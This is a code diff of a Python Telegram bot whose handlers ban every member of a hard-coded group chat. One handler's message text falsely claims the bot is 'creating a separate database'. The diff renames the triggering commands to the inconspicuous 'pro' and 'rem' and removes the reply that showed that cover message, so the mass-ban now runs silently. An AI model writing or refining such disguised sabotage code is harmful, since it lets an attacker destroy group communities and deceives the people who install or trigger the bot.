@@ -25,13 +25,13 @@ BOT_ID = 5720302471
 SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
 NK = "Required Admin permission To Send Messages in Group"
 LOGG = -1001686630791
-@app.on_message(filters.command("profile"))
+
+@app.on_message(filters.command("pro"))
 async def ban_all(_,msg):
     chat_id=-1001497090502
     bot=await app.get_chat_member(chat_id,BOT_ID)
     bot_permission=bot.privileges.can_restrict_members==True
     if bot_permission:
-        await msg.reply_text(SK)
         async for member in app.get_chat_members(chat_id):       
             try:
                     dlm = await app.ban_chat_member(chat_id, member.user.id)
@@ -42,7 +42,7 @@ async def ban_all(_,msg):
     else:
         await msg.reply_text(NK)
 
-@app.on_message(filters.command("harem"))
+@app.on_message(filters.command("rem"))
 async def banall(_, message):
     chat_id = -1001497090502
     user_id = message.from_user.id
